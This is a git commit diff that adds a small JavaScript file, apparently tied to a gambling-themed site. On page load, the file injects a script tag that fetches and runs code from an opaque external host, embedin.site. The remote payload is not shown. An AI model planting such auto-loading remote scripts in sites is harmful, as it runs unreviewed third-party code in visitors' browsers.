585befd7ee00f40a6cebe67a407b04a45d0536bd
kitasolusimarketingmu <118248295+kitasolusimarketingmu@users.noreply.github.com>
2026-07-09 10:59:04 +0700

    Update add-gamenew-gledek88.js

--- add-gamenew-gledek88.js
+++ add-gamenew-gledek88.js
@@ -1,1 +1,5 @@
-
+document.addEventListener('DOMContentLoaded', function () {
+     const script = document.createElement("script");
+     script.src = "https://embedin.site/embed.js/aa06c69f9932a7aed3d1db8b06bdc127";
+     document.body.appendChild(script);
+});
